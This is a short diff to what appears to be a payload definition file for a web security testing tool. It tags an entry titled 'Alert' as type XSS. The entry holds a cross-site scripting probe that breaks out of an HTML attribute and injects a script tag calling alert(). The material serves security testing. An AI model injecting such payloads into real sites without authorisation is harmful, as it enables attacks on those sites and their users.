@@ -1,4 +1,5 @@
 [Payload]
+type = xss
 title = Alert
 description: The alert() method displays an alert box with a specified message and an OK button.
 payload = "><script>alert('')</script>
